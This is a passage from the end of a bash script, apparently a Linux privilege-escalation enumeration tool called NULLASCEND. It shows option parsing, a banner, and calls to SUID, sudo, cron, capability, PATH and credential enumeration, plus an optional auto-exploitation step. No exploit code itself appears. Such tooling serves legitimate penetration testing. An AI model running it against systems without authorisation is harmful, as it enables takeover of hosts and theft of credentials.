    elif [[ $total -gt 0 ]]; then
        print_finding "INFO" "Review MEDIUM findings for potential escalation paths"
    else
        print_finding "INFO" "No obvious privilege escalation vectors identified"
    fi
    
    echo ""
    echo "Reference: https://gtfobins.github.io/ | https://book.hacktricks.xyz/"
}


main() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -o) OUTPUT_FILE="$2"; shift 2 ;;
            -q) QUIET_MODE=true; shift ;;
            -v) VERBOSE_MODE=true; shift ;;
            --auto) AUTO_EXPLOIT=true; shift ;;
            -h|--help)
                echo "Usage: $0 [-o output.txt] [-q] [-v] [--auto]"
                echo "  -o FILE    Save output to file"
                echo "  -q         Quiet mode (findings only)"
                echo "  -v         Verbose mode (show all SUID binaries)"
                echo "  --auto     Enable auto-exploitation (requires confirmation)"
                exit 0
                ;;
            *) echo "Unknown option: $1"; exit 1 ;;
        esac
    done
    
    if [[ -n "$OUTPUT_FILE" ]]; then
        exec > >(tee "$OUTPUT_FILE") 2>&1
    fi
    
    echo ""
    echo "┌────────────────────────────────────────────────────────────────┐"
    echo "│                          NULLASCEND                            │"
    echo "└────────────────────────────────────────────────────────────────┘"
    echo ""
    echo "                              by:"
    echo "                                                                     
  ▄▄▄                                                                
▄██▀▀▀                   █▄                            █▄            
██ ▄▀█▄                  ██       ▄                   ▄██▄      ▄    
██   ██ ▀██ ██▀ ▄▀▀█▄ ▄████ ▄▀▀█▄ ███▄███▄ ▄▀▀█▄ ▄██▀█ ██ ▄███▄ ████▄
██  ▄██   ███   ▄█▀██ ██ ██ ▄█▀██ ██ ██ ██ ▄█▀██ ▀███▄ ██ ██ ██ ██   
 ▀███▀  ▄██ ██▄▄▀█▄██▄█▀███▄▀█▄██▄██ ██ ▀█▄▀█▄███▄▄██▀▄██▄▀███▀▄█▀   
                                                                     
                                                                     "
    echo "Started: $(date)"
    
    if $AUTO_EXPLOIT; then
        echo ""
        echo -e "${YELLOW}[!] Auto-exploitation mode enabled${NC}"
        echo -e "${YELLOW}[!] Exploits will be queued and executed after enumeration${NC}"
    fi
    
    enum_system
    enum_suid
    enum_sudo
    enum_cron
    enum_capabilities
    enum_writable
    enum_path
    enum_credentials
    
    print_summary
    
    if $AUTO_EXPLOIT; then
        run_auto_exploit
    fi
    
    echo ""
    echo "Complete: $(date)"
    echo ""
}

main "$@"